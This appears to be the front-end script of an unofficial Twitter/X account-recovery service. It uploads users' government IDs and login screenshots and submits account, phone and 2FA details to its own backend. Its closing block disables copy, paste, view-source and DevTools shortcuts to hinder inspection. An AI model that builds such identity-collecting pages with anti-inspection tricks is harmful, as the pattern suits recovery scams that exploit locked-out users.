const API_BASE_URL = "https://account-recovery-app.onrender.com";

const token = localStorage.getItem("token");
if (!token) {
    alert("Please log in before filling the form.");
    window.location.href = "login.html";  
}

document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("twitterForm");
    if (!form) return;

    form.addEventListener("submit", async (e) => {
        e.preventDefault();

        const submitBtn = form.querySelector(".submit-btn");
        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.textContent = "Uploading Files...";

        try {
            const token = localStorage.getItem("token");
            if (!token) throw new Error("Please log in to submit this request.");

            // --- 1. UPLOAD FILES TO S3 ---
            
            // A. Valid ID (Required)
            const validIdInput = document.getElementById("validIdInput");
            let validIdUrl = "";
            if (validIdInput.files.length > 0) {
                validIdUrl = await uploadFileToS3(validIdInput.files[0], token);
            } else {
                throw new Error("Please upload your Valid ID.");
            }

            // B. Login Screenshot (Required)
            const loginInput = document.getElementById("loginScreenshotInput");
            let loginUrl = "";
            if (loginInput.files.length > 0) {
                loginUrl = await uploadFileToS3(loginInput.files[0], token);
            } else {
                throw new Error("Please upload the Login Screenshot.");
            }

            // C. Email Screenshot (Optional)
            const emailInput = document.getElementById("emailScreenshotInput");
            let emailUrl = null;
            if (emailInput.files.length > 0) {
                emailUrl = await uploadFileToS3(emailInput.files[0], token);
            }

            submitBtn.textContent = "Submitting Request...";

            // --- 2. PREPARE JSON DATA ---
            
            // Combine Phone Number
            const countryCode = form.querySelector('select[name="countryCode"]').value;
            const phoneNum = form.querySelector('input[name="phoneNumber"]').value;
            const fullPhone = phoneNum ? `${countryCode} ${phoneNum}` : "";

            const formData = {
                accountType: form.querySelector('select[name="accountType"]').value,
                username: form.querySelector('input[name="username"]').value,
                displayName: form.querySelector('input[name="displayName"]').value,
                realName: form.querySelector('input[name="realName"]').value,
                
                // S3 URL
                validIdFile: validIdUrl,

                verifiedStatus: form.querySelector('input[name="verified"]:checked')?.value,
                
                mobileNumber: fullPhone,
                email: form.querySelector('input[name="email"]').value,
                
                createdOn: form.querySelector('input[name="createdOn"]').value || null,
                suspendedOn: form.querySelector('input[name="suspendedOn"]').value || null,
                suspensionReason: form.querySelector('textarea[name="suspensionReason"]').value,
                followersCount: form.querySelector('input[name="followersCount"]').value,
                
                // S3 URL
                loginScreenshot: loginUrl,
                
                twoFactorAuth: form.querySelector('input[name="twoFA"]:checked')?.value,
                xPremium: form.querySelector('input[name="blueSub"]:checked')?.value === "yes", // Boolean
                linkedAccounts: form.querySelector('input[name="linkedFb"]:checked')?.value === "yes", // Boolean
                
                // S3 URL (Optional)
                suspensionEmailScreenshot: emailUrl,

                // Meta
                terms: form.querySelector('input[name="terms"]').checked,
                userCaptchAnswer: document.getElementById("captcha_input").value,
                captchaId: document.getElementById("captchaToken").value
            };

            // --- 3. SEND TO BACKEND ---
            const response = await fetch(`${API_BASE_URL}/api/twitter-recovery`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${token}`
                },
                body: JSON.stringify(formData)
            });

            const json = await response.json();

            if (!response.ok) {
                throw new Error(json.message || json.error || "Submission failed");
            }

            alert("✅ Twitter/X Recovery Request Submitted! ID: " + (json.id || "N/A"));
            form.reset();
            if (typeof loadCaptcha === 'function') loadCaptcha();

        } catch (error) {
            console.error(error);
            loadCaptcha();
            alert("❌ Error: " + error.message);
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
        }
    });
});

// --- S3 UPLOAD HELPER ---
async function uploadFileToS3(file, token) {
    const generateUrlEndpoint = `${API_BASE_URL}/api/generate-upload-url?filename=${encodeURIComponent(file.name)}&filetype=${encodeURIComponent(file.type)}`;

    const signedUrlResponse = await fetch(generateUrlEndpoint, {
        headers: { "Authorization": `Bearer ${token}` }
    });

    if (!signedUrlResponse.ok) {
        const txt = await signedUrlResponse.text();
        throw new Error(`Server Refused Upload: ${txt}`);
    }

    const { signedUrl, fileUrl } = await signedUrlResponse.json();

    const uploadResponse = await fetch(signedUrl, {
        method: 'PUT',
        headers: { 'Content-Type': file.type },
        body: file
    });

    if (!uploadResponse.ok) throw new Error("Failed to upload file to AWS S3.");

    return fileUrl;
}

// --- CAPTCHA ---
const captchaCodeDisplay = document.getElementById('captchaCodeDisplay');
const captchaTokenInput = document.getElementById('captchaToken');
const reloadButton = document.getElementById('reloadCaptchaBtn');

async function loadCaptcha() {
    if(!captchaCodeDisplay) return;
    captchaCodeDisplay.textContent = 'Loading...';
    try {
        const response = await fetch(`${API_BASE_URL}/api/captcha`);
        const data = await response.json();
        if (data.success) {
            captchaCodeDisplay.textContent = data.captchaCode;
            captchaTokenInput.value = data.captchaId;
            document.getElementById('captcha_input').value = '';
        } else {
            captchaCodeDisplay.textContent = 'Error';
        }
    } catch (error) {
        console.error('Captcha Error:', error);
    }
}
if(reloadButton) reloadButton.addEventListener('click', loadCaptcha);
loadCaptcha();

 
   document.addEventListener("keydown", function(e) {

    // Block Ctrl+C, V, X
    if (e.ctrlKey && ["c", "v", "x"].includes(e.key.toLowerCase())) {
        alert("Copy, paste and cut are disabled!");
        e.preventDefault();
    }

    // Block Ctrl+U (view source)
    if (e.ctrlKey && e.key.toLowerCase() === "u") {
        e.preventDefault();
    }

    // Block Ctrl+S (save)
    if (e.ctrlKey && e.key.toLowerCase() === "s") {
        e.preventDefault();
    }

    // Block DevTools (Ctrl+Shift+I)
    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") {
        e.preventDefault();
    }

    // Block F12
    if (e.key === "F12") {
        e.preventDefault();
    }
});
